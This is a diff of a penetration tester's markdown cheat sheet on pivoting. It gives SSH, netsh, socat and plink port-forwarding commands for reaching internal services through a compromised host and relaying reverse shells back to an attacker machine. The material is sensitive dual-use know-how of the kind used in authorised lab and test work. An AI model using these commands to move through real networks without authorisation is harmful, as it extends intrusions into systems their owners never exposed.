@@ -8,31 +8,26 @@
 
 ## Pivoting
 ### Local Port forwarding
-#### Port forwarding rinetd
-```
-apt install rinetd
-cat /etc/rinetd.conf
-```
-
-#### SSH local port forward
+#### SSH
+- Will connect local port to target port on target IP. 
+- Usefull for example when database server is running on localhost on target and you want to connect to it on your kali.
 ```
 ssh -N -L <LOCAL PORT>:127.0.0.1:<TARGET PORT> <USERNAME>@<TARGET IP>
 ```
 
-#### SSH port forwarding over hop
+#### SSH over hop
+- Will open local port on your kali (BIND_ADDRESS) and connect it to target port and IP over a HOP.
+- Usefull for example when you owned 1 host that can connect to another host that is running mssql and you want to connect from your kali to that mssql service.
 ```
-ssh -N -L <BIND_ADRESS>:<PORT>:<TARGET IP>:<TARGET PORT> <USERNAME>@<HOP IP>
-```
-
-#### SSH port forwards for shells back over hop
-- Execute on Jump host
-```
-ssh -N user@<ATTACKER IP> -p 22 -L 0.0.0.0:4444:127.0.0.1:4444
+ssh -N -L <BIND_ADDRESS>:<LOCAL PORT>:<TARGET IP>:<TARGET PORT> <USERNAME>@<HOP IP>
 ```
 
-### Port forward netsh
+### Netsh Windows
+- Open a port on locap port and IP and send all traffic to target IP and port.
+- Usefull for opening a port on the hop for receiving shells backs.
+- Usefull for example when you owned 1 host that can connect to another host that is running mssql and you want to connect from your kali to that mssql service.
 ```
-netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
+netsh interface portproxy add v4tov4 listenaddress=<LOCCAL IP> listenport=<LOCAL PORT> connectaddress=<TARGET IP> connectport=<TARGET PORT> protocol=tcp
 ```
 
 #### List forwards
@@ -45,27 +40,33 @@ netsh interface portproxy show v4tov4
 netsh interface portproxy delete v4tov4 listenaddress=<IP> listenport=<PORT>
 ```
 
-### Remote port forwarding
-#### SSH forward local port of target back to our kali
-```
-ssh -N -R <BIND_ADRESS>:<PORT>:127.0.0.1:<TARGET PORT> <USERNAME>@<ATTACKER IP>
-```
-
-### Remote port forward socat Windows
+### Socat Windows
 - https://netcologne.dl.sourceforge.net/project/unix-utils/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip
 - Download all dll's and executable on target
-- First hop is compromised machine
+- Open a port on locap port and IP and send all traffic to target IP and port.
+- Usefull for opening a port on the hop for receiving shells backs.
+- Usefull for example when you owned 1 host that can connect to another host that is running mssql and you want to connect from your kali to that mssql service.
 ```
-socat.exe tcp-listen:<LISTENING PORT>,fork tcp-connect:<TARGET IP SECOND HOP>:<TARGET PORT>
+socat.exe tcp-listen:<LISTENING PORT>,fork tcp-connect:<TARGET IP>:<TARGET PORT>
 ```
 
 #### Then let it listen on our kali machine 
-- so we can connect with our windows tool for example
+- so we can connect with our windows tools for example
 ```
 socat tcp-l:<LISTENING PORT>,fork tcp:<TARGET IP TO SEND IT TO (FIRST HOP)>:<TARGET PORT>
 ```
 
-#### Port forwarding plink.exe
+### Remote port forwarding
+- Forward local port of target back to our kali
+
+#### SSH
+- Will connect local port back to our kali. 
+- Usefull for example when database server is running on localhost on target and you want to connect to it on your kali.
+```
+ssh -N -R <BIND_ADRESS>:<PORT>:127.0.0.1:<TARGET PORT> <USERNAME>@<ATTACKER IP>
+```
+
+#### Plink.exe
 ```
 plink.exe <USER>@<IP> -R <ATTACKER PORT>:<TARGET IP>:<TARGET PORT>
 ```
